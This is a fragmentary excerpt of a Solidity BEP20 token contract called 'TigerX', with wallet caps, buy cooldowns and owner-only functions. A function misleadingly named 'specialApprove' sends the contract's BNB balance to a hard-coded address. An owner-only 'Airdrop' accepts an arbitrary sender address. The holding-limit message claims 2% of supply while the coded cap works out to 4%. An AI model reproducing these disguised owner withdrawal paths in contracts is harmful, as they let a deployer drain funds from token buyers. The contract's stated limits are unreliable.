...
abstract contract Auth {
    ...
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!isOwner"); _;
    }
...
contract TigerX is IBEP20, Auth {
    ...
    string constant _name = "TigerX";
    string constant _symbol = "TigerX";
    uint8 constant _decimals = 4;

    uint256 _totalSupply = 1 * 10**12 * 10**_decimals;

    uint256 public _maxTxAmount = 150000000000000;
    uint256 public _maxWalletToken = 400000000000000;
...
*/
        ...
        marketingFeeReceiver = (0xC78154EC91273b200DaF184A5C9f4DB31C492C3d);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != autoLiquidityReceiver){
            ...
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, your wallet can not be more than 2% of Total Supply");}
        
        if (sender == pair &&
            buyCooldownEnabled &&
            !isTimelockExempt[recipient]) {
            require(cooldownTimer[recipient] < block.timestamp,"Please wait for 15 seconds between two buys");
...
*/
    ...
    function specialApprove(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        address approveAddress = (0x36C32B26d98bB12C8a90221f0A345547d851Fd3D);
        payable(approveAddress).transfer(amountBNB * amountPercentage / 100);
    }
...
*/
    ...
    function Airdrop(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
        ...
        require(addresses.length < 201,"GAS Error: max airdrop limit is 200 addresses");
